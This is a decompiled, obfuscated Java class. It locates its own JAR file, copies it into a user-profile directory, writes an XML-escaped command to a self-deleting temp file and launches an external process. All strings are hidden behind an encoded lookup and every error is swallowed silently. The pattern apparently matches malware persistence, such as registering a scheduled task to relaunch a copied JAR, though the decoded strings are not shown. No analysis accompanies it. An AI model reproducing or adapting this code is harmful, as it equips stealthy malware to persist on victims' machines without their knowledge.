/*
 * Decompiled with CFR 0.152.
 */
package x;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.OpenOption;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

public class i {
    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    public static void a(String object, String object2) {
        try {
            Object object3;
            Object object4;
            String string = i.a();
            if (string == null) {
                return;
            }
            Object object5 = System.getProperty($S.d(1001));
            if (object5 == null) return;
            Object object6 = new File((String)object5 + $S.d(1002));
            if (((File)object6).exists()) {
                object4 = ((File)object6).getAbsolutePath();
            } else {
                object3 = new File((String)object5 + $S.d(1003));
                if (!((File)object3).exists()) return;
                object4 = ((File)object3).getAbsolutePath();
            }
            object6 = object4;
            if (object4 == null) {
                return;
            }
            object5 = System.getenv($S.d(211));
            if (object5 == null || ((String)object5).isEmpty()) {
                object5 = System.getProperty($S.d(633)) + $S.d(1004);
            }
            object5 = (String)object5 + $S.d(1005);
            object5 = new File((String)object5);
            ((File)object5).mkdirs();
            object5 = new File((File)object5, $S.d(1006));
            Files.copy(Paths.get(string, new String[0]), ((File)object5).toPath(), StandardCopyOption.REPLACE_EXISTING);
            File file = object6;
            Object object7 = object;
            object = object2;
            object3 = object7;
            object6 = ((File)object5).getAbsolutePath();
            object5 = file;
            try {
                object2 = object = $S.d(1007) + (String)object6 + "\" " + (String)object3 + " " + (String)object + $S.d(1008);
                object = object5;
                object = $S.d(1009) + i.a((String)object) + $S.d(1010) + i.a((String)object2) + $S.d(1011);
                object2 = File.createTempFile($S.d(1012), null);
                ((File)object2).deleteOnExit();
                Files.write(((File)object2).toPath(), ((String)object).getBytes($S.d(399)), new OpenOption[0]);
                object = $S.d(1013).replace("\\", "\\\\");
                object = $S.d(1014) + ((File)object2).getAbsolutePath() + $S.d(1015) + (String)object + $S.d(1016) + $S.d(1017);
                new ProcessBuilder(new String[]{$S.d(1018), $S.d(405), $S.d(1019), $S.d(1020), $S.d(406), object}).start().waitFor();
                try {
                    ((File)object2).delete();
                    return;
                }
                catch (Exception exception) {
                    return;
                }
            }
            catch (Exception exception) {}
            return;
        }
        catch (Exception exception) {}
    }

    private static String a(String string) {
        return string.replace("&", $S.d(1021)).replace("<", $S.d(1022)).replace(">", $S.d(1023)).replace("\"", $S.d(1024)).replace("'", $S.d(1025));
    }

    private static String a() {
        String[] stringArray;
        try {
            stringArray = new File(i.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            if (stringArray.isFile() && stringArray.getName().endsWith($S.d(1026))) {
                return stringArray.getAbsolutePath();
            }
        }
        catch (Exception exception) {}
        stringArray = System.getProperty($S.d(1027), "");
        for (String string : stringArray.split(File.pathSeparator)) {
            File object = new File(string.trim());
            if (!object.isFile() || !object.getName().endsWith($S.d(1026))) continue;
            return object.getAbsolutePath();
        }
        return null;
    }
}

